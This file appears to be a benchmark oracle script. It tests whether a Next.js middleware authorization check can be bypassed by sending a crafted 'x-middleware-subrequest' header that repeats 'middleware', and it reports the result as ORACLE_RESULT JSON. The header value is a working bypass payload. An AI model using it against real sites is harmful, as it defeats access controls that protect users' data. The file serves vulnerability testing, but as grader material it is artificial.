const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const markerDir = path.join(os.tmpdir(), 'next-authz-bypass-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2));
  fs.mkdirSync(markerDir, { recursive: true });

  let runMiddleware;
  let NextRequest;
  try {
    runMiddleware = require('next/dist/server/web/sandbox/sandbox').run;
    NextRequest = require('next/dist/server/web/spec-extension/request').NextRequest;
  } catch (e) {
    evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
    emit();
    return;
  }

  if (typeof runMiddleware !== 'function' || typeof NextRequest !== 'function') {
    evidence = 'missing_required_exports';
    emit();
    return;
  }

  const middlewareCode = `
    import { NextResponse } from 'next/server'
    export default function middleware(req) {
      if (req.nextUrl.pathname.startsWith('/protected')) {
        return NextResponse.redirect(new URL('/login', req.url))
      }
      return NextResponse.next()
    }
  `;

  async function invoke(pathname, subreqHeader) {
    const headers = new Headers();
    if (subreqHeader !== undefined) headers.set('x-middleware-subrequest', subreqHeader);

    const req = new NextRequest('http://localhost:3000' + pathname, { headers, method: 'GET' });

    return await runMiddleware({
      name: 'middleware',
      paths: ['/middleware'],
      edgeFunctionEntry: {
        wasm: [],
        env: [],
        assets: [],
        files: [],
        name: 'middleware',
        page: '/middleware',
        region: 'auto'
      },
      request: req,
      useCache: false,
      onWarning: () => {},
      distDir: markerDir,
      middleware: {
        files: [
          {
            name: 'middleware.js',
            content: middlewareCode
          }
        ],
        name: 'middleware',
        page: '/middleware'
      }
    });
  }

  (async () => {
    let benign;
    try {
      benign = await invoke('/protected/dashboard');
    } catch (e) {
      evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
      emit();
      return;
    }

    const benignHasRedirect = !!(benign && benign.response && benign.response.headers && benign.response.headers.get && benign.response.headers.get('location'));
    if (!benignHasRedirect) {
      evidence = 'benign_failed:no_redirect';
      emit();
      return;
    }

    operation_completed = true;

    try {
      const attackHeader = 'middleware:middleware:middleware:middleware:middleware';
      const attacked = await invoke('/protected/dashboard', attackHeader);
      const attackLocation = attacked && attacked.response && attacked.response.headers && attacked.response.headers.get ? attacked.response.headers.get('location') : null;
      exploit_succeeded = !attackLocation;
      evidence = 'benign_redirect=1|attack_redirect=' + (attackLocation ? 1 : 0) + '|attack_header=' + attackHeader;
      fs.writeFileSync(path.join(markerDir, 'evidence.txt'), evidence);
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
    }

    emit();
  })().catch((e) => {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
    emit();
  });
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
  emit();
}